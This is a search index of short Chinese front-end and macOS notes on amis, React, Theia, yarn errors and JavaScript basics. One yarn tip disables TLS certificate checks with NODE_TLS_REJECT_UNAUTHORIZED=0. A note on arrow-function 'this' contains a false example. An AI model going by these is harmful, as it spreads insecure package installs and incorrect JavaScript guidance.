'validate.isVariableName' } JS函数自定义规则 参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/extend/addon#扩展表单验证 官网用例: let amisLib = amisRequire('amis'); amisLib.addRule( // 校验名 'isZXS', // 校验函数，values 是表单里所有表单项的值，可用于做联合校验；value 是当前表单项的值 (values, value) => { if (value === '新加坡') { // 校验不通过，提示：该地区不在国内 return { error: true, msg: '该地区不在国内' }; } if ( value === '北京' || value === '上海' || value === '天津' || value === '重庆' ) { // return true 表示校验通过 return true; } // 校验不通过，提示：输入的不是直辖市 return { error: true, msg: '输入的不是直辖市' }; } ); 其他相关配置 表单项值发生变化即校验 \"validateOnChange\": true","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-Form-verification.html","loc":"/yq-doc-source-docs-front-end-frame-amis-Form-verification.html"},{"title":"amis-支持的actonType(事件动作)","text":"参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action 自定义JS 参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts/event-action#自定义-js actionType 为 custom script 为函数或者函数字符串, 函数签名: script:(context,doAction,event)=>{} context，渲染器上下文 doAction() 动作执行方法，用于调用任何 actionType 指定的动作 event，事件对象，可以调用 setData()、stopPropagation()、preventDefault() 分别实现事件上下文设置、动作干预、事件干预，可以通过 event.data 获取事件上下文(应该叫数据域吧) 参考: { \"type\": \"page\", \"body\": [ { \"type\": \"button\", \"label\": \"发送一个 http 请求\", \"level\": \"primary\", \"onEvent\": { \"click\": { \"actions\": [ { \"actionType\": \"custom\", \"script\": \"doAction({actionType: 'ajax', args: {api: '/amis/api/mock2/form/saveForm'}});\\n //event.stopPropagation();\" } ] } } } ] } 注解 对于 button 的点击事件, 直接在其同级写 actionType: \"custom\" 无效, 需要定义 onEvent -> click -> actions 才行(如上). 存储数据 有时在执行自定义 JS 的时候，希望该过程中产生的数据可以分享给后面的动作使用， 此时可以通过 event.setData() 来实现事件上下文的设置，这样后面动作都可以通过事件上下文来获取共享的数据。 注意：直接调用 event.setData() 将修改事件的原有上下文， 如果不希望覆盖可以通过 event.setData({...event.data, ...{xxx: xxx}}) 来进行数据的合并。","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-Supported-ActonType.html","loc":"/yq-doc-source-docs-front-end-frame-amis-Supported-ActonType.html"},{"title":"amis","text":"Github地址: https://github.com/baidu/amis Amis 是百度开源的一块前端低代码框架， 通过 JSON 配置就能生成各种后台页面，极大减少开发成本，甚至可以不需要了解前端。 使用 原文: https://aisuda.bce.baidu.com/amis/zh-CN/docs/start/getting-started 有两种方式 原生JS脚本导入(SDK导入) 直接 npm i amis , 在 node_modulesamissdk 目录里就能找到; 或者直接下载包文件 https://github.com/baidu/amis/releases/download/3.5.2/sdk.tar.gz , 手动解压. 用例: <script src=\"sdk.js\"></script> <script type=\"text/javascript\"> (function () { let amis = amisRequire('amis/embed'); // 通过替换下面这个配置来生成不同页面 let amisJSON = { type: 'page', title: '表单页面', body: { type: 'form', mode: 'horizontal', api: '/saveForm', body: [ { label: 'Name', type: 'input-text', name: 'name' }, { label: 'Email', type: 'input-email', name: 'email' } ] } }; let amisScoped = amis.embed('#root', amisJSON); })(); </script> 默认 amis 渲染是单页模式 如果是单页应用，在离开当前页面的时候通常需要销毁实例: amisScoped.unmount(); React项目 直接 npm i amis 数据域初始化 直接使用确定的数据 使用 data : { \"type\": \"page\", \"data\": { \"name\": \"zhangsan\", \"age\": 20 }, \"body\": [ { \"type\": \"tpl\", \"tpl\": \"my name is ${name}\" } ] } 从API获取初始化的数据 使用 initApi { \"type\": \"page\", \"initApi\": \"/amis/api/initData\", \"body\": \"Hello ${text}\" } 注意API的返回数据必定是这种格式: { \"status\": 0, \"msg\": \"\", \"data\": { \"text\": \"World!\" ...其他字段 } } 以上最外层字段必须有, 可以增加, 不能减少, data 类型必是字典 注解 并不是所有组件都支持配置初始化接口来实现数据域初始化操作， 对于那些 不支持配置初始化接口的组件 来说，一般会使用 Service 组件 来辅助实现数据域初始化； 如果两种同时配置, 那么将会合并两种结果 重要 什么叫, 具备数据域的组件? 直白来说, 就是当经过这一层时候, 会创建新的数据域, 这个时候 当定义data时, 无法使用$来引用上层数据域的数据 , 而是直接将其当作字符串. 具备数据域的组件(或者说 支持配置初始化接口 的组件?): App Page Cards Chart CRUD CRUD2 Dialog Drawer List Page PaginationWrapper Service Wizard Combo InputArray Table Table2 注解 一般对于不支持数据域的组件, 想使用数据域时, 往往是在外层包裹一层 Service 数据链 一般情况下, 子层的数据域, 如果获取的值不存在, 会递归向上查找, 甚至可以拿到URL路径的参数(url 中的参数会进入顶层数据域) 默认行为, 预定义只找上层和上上层. 定义查找范围, 使用 trackExpression : trackExpression: \"none\" : 不追踪任何数据 trackExpression: \"${xxxVariable}\" : xxxVariable 变化了更新当前组件的数据链 可以监听多个变量比如: \"${xxx1},${xxx2}\"，还可以写表达式如 \"${ xxx ? xxx : yyy}\"。 如果变量是数组，或者对象，会转成统一的字符串 [object Array] 或者 [object Object] ; 这个其实会影响检测的，所以建议转成 json 字符串如。 ${xxxObject | json}。 还有就是既然是监控上层数据，表达式中不要写当前层数据变量，是取不到的。 逻辑函数 IF(condition, consequent, alternate) -> consequent | alternate 相当于三目表达式. AND(expression1, expression2, ...expressionN) -> bool OR(expression1, expression2, ...expressionN) -> bool XOR(condition1, condition2, ...expressionN) -> bool IFS(condition1, result1, condition2, result2,...conditionN, resultN) -> any 相当于多个 else if 合并成一个 数学函数 ABS(num) -> number 求绝对值 MAX(num1, num2, ...numN) -> number 如果只有一个参数且是数组，则计算这个数组内的值, 下同 MIN(num1, num2, ...numN) -> number SUM(num1, num2, ...numN) -> number INT(num) -> number MOD(num, divisor) -> number 返回两数相除的余数，参数 number 是被除数，divisor 是除数。 PI() -> number 圆周率 ROUND(num[, numDigits = 2]) -> number 将数字四舍五入到指定的位数，可以设置小数位 FLOOR(num[, numDigits=2]) 向下取整 CEIL(num[, numDigits=2]) -> number 将数字向上取整到指定的位数，可以设置小数位 SQRT(num) -> number 开平方，参数 number 为非负数 AVG(num1, num2, ...numN) -> number 平均值 DEVSQ(num1, num2, ...numN) -> number 返回数据点与数据均值点之差（数据偏差）的平方和，如果只有一个参数且是数组，则计算这个数组内的值。 AVEDEV(num1, num2, ...numN) -> number 数据点到其算术平均值的绝对偏差的平均值 HARMEAN(num1, num2, ...numN) -> number 数据点的调和平均值，如果只有一个参数且是数组，则计算这个数组内的值 LARGE(array, k) -> number 数据集中第 k 个最大值 UPPERMONEY(num) -> string 将数值转为中文大写金额 RAND() -> number 返回大于等于 0 且小于 1 的均匀分布随机实数。每一次触发计算都会变化 LAST(array) -> any 取数组最后一个 POW(base, exponent) -> number 基数 base 的指数次幂 文本函数 参考: https://aisuda.bce.baidu.com/amis/zh-CN/docs/concepts /expression#新表达式语法 日期函数 数组函数 编码函数 ENCODEJSON({name: 'amis'}) 将JS对象转换成JSON字符串 DECODEJSON('{\"name\": \"amis\"}') 解析JSON编码数据，返回JS对象 其他函数 GET(obj:any, path:string, defaultValue:any) 根据对象或者数组的path路径获取值。 如果解析 value 是 undefined 会以 defaultValue 取代 ISTYPE(obj:any, type: string) 判断是否为类型支持：string, number, array, date, plain-object 如: ISTYPE([{a: '1'}, {b: '2'}, {a: '1'}], 'array') 图标使用 详细见: https://aisuda.bce.baidu.com/amis/zh-CN/components/icon 导入CSS: @fortawesome/fontawesome-free/css/all.css react安装: yarn add @fortawesome/fontawesome @fortawesome/react-fontawesome @fortawesome/fontawesome-free --save 通过名称使用: { \"type\": \"page\", \"body\": { \"type\": \"icon\", \"icon\": \"cloud\" } } 也支持用url: { \"type\": \"page\", \"body\": { \"type\": \"icon\", \"icon\": \"https://suda.cdn.bcebos.com/images%2F2021-01%2Fdiamond.svg\" } } icon 默认支持fontawesome v4(vendor默认为 \"fa\" 表示v4)， 如果想要支持 v5 以及 v6 版本的 fontawesome 请设置 vendor 为空字符串: { \"type\": \"icon\", \"icon\": \"far fa-address-book\", \"vendor\": \"\" }, v5 用 far/fas 等表示前缀; 详细V5图标库见: https://fontawesome.com/v5/search?m=free v6 用 fa-regular / fa-solid 等表示前缀: { \"type\": \"icon\", \"icon\": \"fa-regular fa-address-book\", \"vendor\": \"\" }, 详细V6图标库见: https://fontawesome.com/icons/list","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-amis-amis.html","loc":"/yq-doc-source-docs-front-end-frame-amis-amis.html"},{"title":"高性能React组件","text":"滚动组件 Virtuoso Virtuoso 是 React 中一个非常强大的滚动组件,它可以实现几十万条数据的高性能滚动。 Virtuoso 的一些主要特性包括: 滚动性能极高 - 通过仅渲染可视区域内的组件来优化滚动性能,能够平滑滚动数十万行数据。 滚动位置追踪 - 精确追踪滚动位置,触发加载更多等功能。 懒加载 - 只有在内容滚动到可视区域时才渲染,提高初始加载速度。 无限加载 - 支持上拉无限加载更多数据。 窗口化 - 仅加载可视区域内的内容,降低内存占用。 可定制 - 提供多种 API 进行定制,可以自由控制滚动效果。 使用 Virtuoso 实现的滚动效果非常流畅顺滑,基本没有卡顿,并且可以承载很大的数据量。 它利用了虚拟化技术,通过复用 DOM 节点来达到高性能滚动的效果。 一个常见的 Virtuoso 使用示例: import { Virtuoso } from 'react-virtuoso'; <Virtuoso data={largeDataSource} itemContent={index => { // 渲染行 }} onEndReached={loadMore} components={{ Footer: () => <div>Footer</div> }} /> 在 React 项目中,如果需要实现高性能的大数据量滚动,Virtuoso 是非常好的选择。它可以创建出类似原生应用那么流畅的滚动效果。 （已编辑）","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-High--performance-component.html","loc":"/yq-doc-source-docs-front-end-frame-react-High--performance-component.html"},{"title":"一些好用的react库","text":"react-tooltip 安装: npm i react-tooltip 用于 鼠标移入 时候的提示显示: <div> <a data-tooltip-id=\"my-tooltip\" data-tooltip-content=\"Hello world!\"> ◕‿‿◕ </a> <Tooltip id='my-tooltip'></Tooltip> </div> 效果 rc-tree 官网: https://www.npmjs.com/package//rc-tree 安装: npm i rc-tree 效果","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-react-Some-useful-react-libraries.html","loc":"/yq-doc-source-docs-front-end-frame-react-Some-useful-react-libraries.html"},{"title":"创建自己的IDE","text":"其实跟着官方文档走就行了, 主要可能遇到的问题就是依赖包的问题, 可以直接按照官网文档给的来: https://theia-ide.org/docs/composing_applications/ , 复制文档最后一个 package.json 即可 不过这里的就过只是一个基于浏览器的版本, 如果想要使用 Electron 运行, 那么需要在依赖项中加入 electron 和 @theia/electron , 在 theia 项中加入目标为 electron 即可: \"theia\": { \"target\": \"electron\" } 还需要指定一下 electron 的main文件(启动文件): \"main\": \"lib/backend/electron-main.js\", 如果是自定义的启动文件, 需要在自定义启动文件里手动 require 导入一下这个包. 这里不需要手动去弄一个 electron 启动的js, 因为theia内部已经定义好了, 只需要制定一下目标, 以及构建的时候也指定即可: theia rebuild:electron --cacheRoot ./.theia_build/cache 这里加了 cacheRoot , 表示缓存目录, 下次再编的时候就会用这里的比对分析 最终的package.json内容大致如下: { \"private\": true, \"name\": \"theia-ide\", \"main\": \"lib/backend/electron-main.js\", \"dependencies\": { \"@theia/callhierarchy\": \"latest\", \"@theia/electron\": \"&#94;1.41.0\", \"@theia/file-search\": \"latest\", \"@theia/git\": \"latest\", \"@theia/markers\": \"latest\", \"@theia/messages\": \"latest\", \"@theia/navigator\": \"latest\", \"@theia/outline-view\": \"latest\", \"@theia/plugin-ext-vscode\": \"latest\", \"@theia/preferences\": \"latest\", \"@theia/preview\": \"latest\", \"@theia/search-in-workspace\": \"latest\", \"@theia/terminal\": \"latest\", \"@theia/vsx-registry\": \"latest\", \"electron\": \"&#94;26.2.1\" }, \"devDependencies\": { \"@theia/cli\": \"latest\", \"electron\": \"&#94;26.2.1\" }, \"scripts\": { \"prepare\": \"yarn run clean && yarn build && yarn run download:plugins\", \"clean\": \"theia clean\", \"build\": \"theia rebuild && theia build --mode development\", \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia_build/cache\", \"start\": \"theia start --plugins=local-dir:plugins\", \"download:plugins\": \"theia download:plugins\" }, \"theia\": { \"target\": \"electron\" }, \"theiaPluginsDir\": \"plugins\", \"theiaPlugins\": { \"vscode-builtin-extensions-pack\": \"https://open-vsx.org/api/eclipse-theia/builtin-extension-pack/1.50.1/file/eclipse-theia.builtin-extension-pack-1.50.1.vsix\" }, \"theiaPluginsExcludeIds\": [ \"ms-vscode.js-debug-companion\", \"vscode.extension-editing\", \"vscode.git\", \"vscode.git-ui\", \"vscode.github\", \"vscode.github-authentication\", \"vscode.microsoft-authentication\" ] } 要启动的话, 直接 yarn install 然后 yarn prepare 编译构建下, 再 yarn start 启动即可, 注意解决这期间的报错等 如果需要ts, 在项目根手动创建 tsconfig.json , 内容大致如下, 按需修改: { \"compilerOptions\": { \"baseUrl\": \".\", \"emitDecoratorMetadata\": true, \"experimentalDecorators\": true, \"module\": \"commonjs\", \"moduleResolution\": \"node\", \"noImplicitAny\": true, \"paths\": { // \"*\": [\"src/*\"] }, \"removeComments\": false, \"sourceMap\": true, \"strict\": true, \"suppressImplicitAnyIndexErrors\": true, \"target\": \"esnext\", \"rootDir\": \"src\", \"outDir\": \"out\", \"jsx\": \"react\" }, \"include\": [ \"src\" ], \"exclude\": [ \"node_modules\" ] } 附: package.json 稍微完善一点的scripts: \"scripts\": { \"build\": \"yarn -s compile && yarn -s bundle\", \"bundle\": \"yarn rebuild && theia build --mode development\", \"clean\": \"theia clean\", \"compile\": \"tsc -b\", \"lint\": \"theiaext lint\", \"rebuild\": \"theia rebuild:electron --cacheRoot ./.theia-build\", \"start\": \"theia start --plugins=local-dir:plugins\", \"start:debug\": \"yarn -s start --log-level=debug --remote-debugging-port=9222\", \"start:watch\": \"concurrently --kill-others -n tsc,bundle,run -c red,yellow,green \\\"tsc -b -w --preserveWatchOutput\\\" \\\"yarn -s watch:bundle\\\" \\\"yarn -s start\\\"\", \"test\": \"electron-mocha --timeout 60000 \\\"./lib/test/**/*.espec.js\\\"\", \"watch\": \"concurrently --kill-others -n tsc,bundle -c red,blue \\\"tsc -b -w --preserveWatchOutput\\\" \\\"yarn -s watch:bundle\\\"\", \"watch:bundle\": \"theia build --watch --mode development\", \"watch:compile\": \"tsc -b -w\" }","tags":"前端","url":"/yq-doc-source-docs-front-end-frame-theia-Create-your-own-IDE.html","loc":"/yq-doc-source-docs-front-end-frame-theia-Create-your-own-IDE.html"},{"title":"不同位置调用时的this指向问题","text":"举例, 比如React父组件将自己的方法传给子组件, 然后子组件再调用此方法. 这个时候可以进入这个传递的方法的内部, 但是, 如果方法内有使用到 this , 那么这个时候的 this 是当前的指针 而不是父组件实例的指针, 方法一: bind 这个时候可以用 bind 来解决这个问题, 若原来传给子组件的是: this.close 改成: this.close.bind(this) 即可. 这里的 this 相当于Python的self 注解 仅可用于传递的是回调, 而非值 若回调内不含this调用可以不bind 方法二: 箭头函数 用例: () => {this.close()} 在 TypeScript 的箭头函数中,this 的指向是继承外层作用域的this,而不是指向箭头函数本身。 主要原因有两个: 箭头函数不会创建自己的this,它只会从自己的作用域链的上一层继承this。 TypeScript 的箭头函数会按照 ES6 的规范实现,其中明确规定了箭头函数内的this与外层this绑定。 举例来说: const obj = { foo: () => { //这里的this指向obj console.log(this) } } obj.foo() // obj 在上例中,箭头函数foo()继承了obj的this, 所以在函数内部打印的this是obj对象,而不是箭头函数本身 总结 bind和箭头函数都可以将this指针绑定为定义时的环境, 而非调用时的环境.","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Arrow-function-this-point-to-the-problem.html","loc":"/yq-doc-source-docs-front-end-question-Arrow-function-this-point-to-the-problem.html"},{"title":"包管理器-常见报错","text":"yarn install时候下载ripgrep代理错误 报错局部信息: GET https://api.github.com/repos/microsoft/ripgrep-prebuilt/releases/tags/v13.0.0-2 Deleting invalid download cache Downloading ripgrep failed: TypeError [ERR_INVALID_PROTOCOL]: Protocol \"https:\" not supported. Expected \"http:\" 或者: Error: Cannot find module '@vscode/ripgrep/bin/rg' 这里是需要下载github的资源, 而由于众所周知的原因, 下载不了, 所以用clash配置了代理, 并给yarn与node都设置了代理, 这里报错是某个node模块的问题, 尝试多次后都无法解决, 后面在 https://github.com/microsoft/vscode-ripgrep/issues/26 看到了一个解决办法: 1. Clone ripgrep locally: git clone git@github.com:microsoft/vscode-ripgrep ~/vscode-ripgrep 2. run yarn in that folder (this seems to work even behind proxy) 3. cp bin/rg ~/vscode-repo-path/node_modules/@vscode/ripgrep 4. run yarn in your vscode repo path again 大致code如下: git clone https://github.com/microsoft/vscode-ripgrep.git cd vscode-ripgrep yarn cp bin/rg ../myproject/node_modules/@vscode/ripgrep yarn 安装时候证书过期 如: error ~/test-electron-win/node_modules/electron: Command failed. Exit code: 1 Command: node install.js Arguments: Directory:~/test-electron-win/node_modules/electron Output: RequestError: certificate has expired at ClientRequest.<anonymous> 网上这个问题很多, 且好多年来一直都有, 但是解决办法寥寥无几, 最终还是设置忽略环境变量解决. 参考: https://github.com/realm/realm-js/issues/5228#issuecomment-1375191886 先使用环境变量来忽略证书验证: NODE_TLS_REJECT_UNAUTHORIZED=0 yarn install 貌似这样安装一次后就有缓存了, 然后改版本以后直接 yarn install 也可以, 不确定是否在缓存的话, 就还是加上 NODE_TLS_REJECT_UNAUTHORIZED 吧.","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Bag-Manager-Common-errors.html","loc":"/yq-doc-source-docs-front-end-question-Bag-Manager-Common-errors.html"},{"title":"浏览器缓存清理","text":"safari清理缓存 Command + , 打开设置: 隐私 -> 管理网站数据 -> `选中需要移除的网站(可搜索)` -> 移除 safari 清理某网站缓存","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Browser-cache-cleaning.html","loc":"/yq-doc-source-docs-front-end-question-Browser-cache-cleaning.html"},{"title":"JSX或TSX的花括号","text":"单花括号表示进入JS语法环境, 双花括号表示JS环境内创建一个对象","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Bunder-of-JSX-or-TSX.html","loc":"/yq-doc-source-docs-front-end-question-Bunder-of-JSX-or-TSX.html"},{"title":"CSS排除指定的选择器","text":"可参考 :doc:`` 现有css类属性a,b,c; a下包含b和c, b下包含c 如何写css选择器, 选择 a下的 不属于b 的c: .a .c:not(.b .c)","tags":"前端","url":"/yq-doc-source-docs-front-end-question-CSS-exclude-the-specified-selector.html","loc":"/yq-doc-source-docs-front-end-question-CSS-exclude-the-specified-selector.html"},{"title":"自定义样式的Checkbox","text":"比如圆形边框 默认情况下，input 元素的复选框（checkbox）的外观是由浏览器自身的样式决定的， 并且这些样式通常不允许直接通过 CSS 的 border-radius 属性来设置圆形边框。 先使用i标签实现一个简单的Checkbox: import React from 'react'; interface CheckedProps{ name?: string initChecked?: boolean description?: string } export class Checkbox extends React.Component<CheckedProps, any> { state = { boxChecked: false } protected changeChecked() { this.setState({boxChecked: !this.state.boxChecked}) } render() { if (typeof this.props.initChecked === \"boolean\"){ this.setState({boxChecked: this.props.initChecked}) } const description = this.props.description return ( <div className={'custom-checkbox-0'}> <input type={'checkbox'} checked={this.state.boxChecked} /> <i onClick={() => {this.changeChecked()}} /> <span /> {description ? ( <div>{description}</div> ) : null} </div> ); } } 主要是样式的设置: /* input标签样式 input禁止掉默认的点击行为, 交给i标签 */ .custom-checkbox-0 > input[type=\"checkbox\"] { position: absolute; clip: rect(1px, 1px, 1px, 1px); pointer-events: none; } /* 普通状态下 **<i>标签内容** 的样式 即没有打勾 */ .custom-checkbox-0 > i::before{ content: \"\"; position: absolute; left: 50%; top: 50%; border-color: whitesmoke; border-style: solid; border-width: 0 ; transform: translate(-50%, -90%) rotate(-40deg); } /* <i> 标签的样式 此处是宝蓝色背景, 接管input的点击行为, 长宽设置为16 */ .custom-checkbox-0 > i { background-color: royalblue; display: inline-block; vertical-align: text-bottom; position: relative; pointer-events: all; width: 16px; height: 16px; cursor: pointer; border: 1px solid; border-radius: 50%; /* 设置圆形 */ } /* <i> 标签选中时的外观 即打勾 (实现原理是只显示左边和右边的边框然后旋转, 看起来就是个勾了) */ .custom-checkbox-0 > input:checked + i:before { width: 8px; height: 4px; border-width: 0 0 1px 1px; } /*.custom-checkbox-0 > input[disabled]:checked + i:before{*/ /* width: 0;*/ /* height: 0;*/ /* border-width: 0;*/ /*}*/ 注解 好像很多东西的默认样式都不是很好改, 得借助其他元素 且纯用css来更改很难","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Checkbox-of-custom-style.html","loc":"/yq-doc-source-docs-front-end-question-Checkbox-of-custom-style.html"},{"title":"electron+react+ts","text":"参考: https://www.cnblogs.com/bleaka/p/16184636.html","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Electron+React+TS.html","loc":"/yq-doc-source-docs-front-end-question-Electron+React+TS.html"},{"title":"前端-函数调用与组件调用","text":"函数调用与组件调用的区别 假设有一个函数组件: const Selector = () => { return (<div></div>) } 这个时候函数调用: Selector() 与组件调用: <Selector/> 基本上是一致的. 但是, 如果函数组件包含了react状态: const Selector = () => { const [ready, setReady] = useState(true) return (<div></div>) } 且如果是在类中调用, 那么只能用: <Selector/> 貌似是因为直接 Selector() 相当于嵌入这个函数, 而类中不能使用状态. 注解 当作组件使用时, 组件名首字母必须大写. 小写的会当作html组件, 不识别","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Front-end-function-call-and-component-call.html","loc":"/yq-doc-source-docs-front-end-question-Front-end-function-call-and-component-call.html"},{"title":"import与require","text":"import与require 是前端导包使用的方式, 遵循两种不同的规范 import - import/export 是ES6引入的新规范，因为浏览器引擎兼容问题，需要在node中用babel将ES6语法编译成ES5语法 - import 是编译时调用，所以必须放在文件的开头 - import 是解构过程。使用import导入模块的属性或者方法是引用传递。且import是read-only的，值是单向传递的。default是ES6 模块化所独有的关键字，export default {} 输出默认的接口对象，如果没有命名，则在import时可以自定义一个名称用来关联这个对象 require - require/exports 是 CommonJS/AMD 中为了解决模块化语法而引入的 - require 是运行时调用，所以理论上可以运作在代码的任何地方 - require 是赋值过程，其实require的结果就是对象、数字、字符串、函数等，再把结果赋值给某个变量。它是普通的值拷贝传递。 - 通过require引入基础数据类型时,属于复制该变量 - 通过require引入复杂数据类型时, 属于浅拷贝该对象 - 出现模块之间循环引用时, 会输出已执行的模块, 未执行模块不会输出 - CommonJS规范默认export的是一个对象,即使导出的是基础数据类型 写法 require/exports 方式的写法比较统一: // exports export.fs = fs module.exports = fs // require const module = require('module') import/export 方式的写法就相对丰富些: // export export default fs; export const fs; export function part; export { part1, part2 }; export * from 'fs'; // import import fs from 'fs'; import { newFs as fs } from 'fs'; // ES6语法, 将fs重命名为newFs, 命名冲突时常用 import { part } from fs; import fs, { part } from fs;","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Import-and-Require.html","loc":"/yq-doc-source-docs-front-end-question-Import-and-Require.html"},{"title":"Object原型方法","text":"对象拷贝-Object.assign() Object.assign() 浅拷贝对象属性, 返回新的对象 如果需要深拷贝, 可以: JSON.parse(JSON.stringify(obj))","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Object-prototype-method.html","loc":"/yq-doc-source-docs-front-end-question-Object-prototype-method.html"},{"title":"package.json增加本地模块","text":"方案一: 直接添加本地路径 如果不介意不使用语意化版本, 可以直接: yarn add link:./src/@ide/right-context-menu -W 或者: yarn add file:./src/@ide/right-context-menu -W 两个效果基本一致, -W 强制指定给根的package.json添加, 效果大概如下: \"dependencies\": { \"@ide/right-context-menu\": \"link:./src/@ide/right-context-menu\" } 或者: \"dependencies\": { \"@ide/right-context-menu\": \"file:./src/@ide/right-context-menu\" } 方案二: 使用语意化版本(这个不行, 看下一个) 但是如果想使用语意化版本, 如: \"dependencies\": { \"@ide/right-context-menu\": \"0.1.0\" } 需要先在 package.json 增加上述语意化版本配置, 然后再链接: yarn add link:./src/@ide/right-context-menu -W 方案三: 使用语意化版本的另一种方式(问的AI) 如果要通过 yarn 来安装本地模块并生成语义化版本,可以这样操作: 在本地模块中定义版本号,例如在 package.json 中设置 \"version\": \"1.0.0\" 在主项目中,使用 yarn link 来链接本地模块: 先注册本地模块, 在本地模块中执行: cd 本地模块所在路径 yarn link 然后返回项目根目录, 在主项目中执行: yarn link 模块名 这时可以在主项目中直接引用和使用本地模块了 通过 yarn add 保存依赖时,会自动读取到本地模块的版本号, 并写入主项目的 package.json: yarn add 模块名 package.json 中将会显示: \"dependencies\": { \"模块名\": \"1.0.0\" } 注解 有时候会有问题, add的时候还是从仓库去找, 而不是直接用本地的... 所以这时候还是得手动加到package.json里面去... 不记得之前是不是有手动加了... 这样就可以通过 yarn 实现在主项目中以语义化版本的方式安装和依赖本地模块。 主要利用了 yarn link 来关联本地模块,并通过 yarn add 来写入正确的依赖版本号。 同时要注意,本地模块的代码改动还会直接影响到主项目,要控制版本并发布,还需要采取额外的措施。 （已编辑） 本地模块的编译 默认情况下, yarn/npm只会处理主项目的构建等 比如本地模块如果是ts, 最笨的办法就是直接去模块目录手动执行 tsc 有一个叫 lerna 的模块, 可以递归编译, 从而达到编译所有本地模块的效果, 使用: lerna init lerna run build 编译报错-node_model的报错 如果构建的时候, 发现编译的确实是本地模块, 但是因为导包, 从而出现了 node_modules 下面模块的检查报错, 可以在 tsconfig.json 配置(根项目): { \"compilerOptions\": { \"skipLibCheck\": true } } 或者配置 learn.json \"command\": { \"build\": { \"typescript\": { \"tsConfigOverride\": { \"skipLibCheck\": true } } } } 也可以直接命令行: tsc --skipLibCheck 注解 想不通的一点是 tsc 没有报错, 但是learn触发的有这个报错; 编译问题-会在根目录拷贝一份源码到配置的outDir 解决: 去除根 tscofig.json 的以下内容: \"compilerOptions\": { \"rootDir\": \"src\", \"outDir\": \"lib\", } \"include\": [ \"src\" ], 注释掉即可","tags":"前端","url":"/yq-doc-source-docs-front-end-question-Package.json-adds-local-modules.html","loc":"/yq-doc-source-docs-front-end-question-Package.json-adds-local-modules.html"},{"title":"vscode项目的编译运行","text":"克隆项目: git clone https://github.com/microsoft/vscode.git 项目根目录下载插件, node模块: yarn 编译: yarn run compile 运行: bash scripts/code.sh 看了网上几年前的帖子说调试需要 yarn run watch 来debug, 但是之要watch了, 就跑不了code.sh, 后面发现, watch要等到跑完才行, 跑到: Finished compilation extensions xxx 更新 clone后下面默认有一个 .vscode/launch.json , 可以使用vscode来完美的断点调试(默认第一个就是) webstorm 试了半天没搞懂怎么调断点. 参考了 .vscode/launch.json , 大致看了一下, 有些步骤没搞懂.","tags":"前端","url":"/yq-doc-source-docs-front-end-question-The-compilation-and-operation-of-the-vSCode-project.html","loc":"/yq-doc-source-docs-front-end-question-The-compilation-and-operation-of-the-vSCode-project.html"},{"title":"html下url编码","text":"参考:: HTML URL 编码参考手册 URL 编码（百分比编码） URL 编码将字符转换为可通过因特网传输的格式。 URL 只能使用 ASCII 字符集 通过因特网进行发送。 由于 URL 通常包含 ASCII 集之外的字符，因此必须将 URL 转换为有效的 ASCII 格式。 URL 编码使用后跟十六进制数字的 \"%\" 替代不安全的 ASCII 字符。 URL 不能包含空格。URL 编码通常使用加号（+）或 %20 替代空格。 ASCII 编码参考 字符 编码后的结果 'space'(空格) %20","tags":"前端","url":"/yq-doc-source-docs-front-end-question-URL-encoding-under-html.html","loc":"/yq-doc-source-docs-front-end-question-URL-encoding-under-html.html"},{"title":"问题总结","text":"通过变量生成正则 如果是确定字符的正则: /\\.txt$/g 表示匹配所有以 .txt 结尾 但是不支持直接拼接变量, 比如想匹配的可能以其他指定字符串结尾, 就只有通过显示的示例: const regStr = '.txt' new RegExp(regStr + '$', 'g') 与上效果一致. 判断是否是数组 使用 Array 内置方法: Array.isArray(obj) 判断是否是绝对路径 使用正则匹配 是否是斜杠开头 或者 是否是字母+冒号+双反斜杠 开头: /&#94;(\\/|[a-z]:\\\\)/i.test(target) test是JS正则自带函数, 返回值为 boolean JS设置预定义变量 有时候, 如果在CSS定义了变量比如背景色, 但可能这个颜色是动态加载的, 导致初始化的时候这个颜色就 会没有定义, 这个时候可以在最初的页面, JS动态设置一个颜色: document.documentElement.style.setProperty('--body-bg', '#1E1E1E') 上次的颜色可以提前放在localStorage: window.localStorage.setItem('bg-color', '#1E1E1E') 逻辑运算符??与||区别 ?? 运算符(空值合并运算符（Nullish Coalescing Operator）) 只会在左操作数为 null 或 undefined 时返回右操作数作为默认值 。 对于其他 falsy 值（如 false、0、空字符串等），?? 运算符不会触发提供默认值的行为 || 运算符在 左操作数为任何 falsy 值时都会返回右操作数 作为默认值 例: > 0 || 4 4 > 0 ?? 4 0","tags":"前端","url":"/yq-doc-source-docs-front-end-question-conclusion-of-issue.html","loc":"/yq-doc-source-docs-front-end-question-conclusion-of-issue.html"},{"title":"mac一直弹登录项","text":"清空登录项: sfltool resetbtm 或者改权限: 555 sfltool dumpbtm: 打印登录项和后台项的当前状态，包括载入的 servicemanagement 有效负载 UUID。 sfltool resetbtm：还原登录项和后台项数据。如果在测试间使用此命令，建议用户也重新启动自己的电脑。 见: 在 Mac 上管理登录项和后台任务","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-question-MAC-has-been-playing-login-items.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-MAC-has-been-playing-login-items.html"},{"title":"MacApp提权","text":"见 MacOS App代码申请管理员权限 AuthorizationExecuteWithPrivileges 使用ServiceManagement.framework注册LaunchdDaemon AppleScript: do shell script \"...\" with administrator privileges","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Mac-question-MacAPP-right.html","loc":"/yq-doc-source-docs-operating-system-Mac-question-MacAPP-right.html"},{"title":"Mac-Xcode 多版本","text":"github上有现成的项目方便切换, 地址: https://github.com/XcodesOrg/XcodesApp/tags 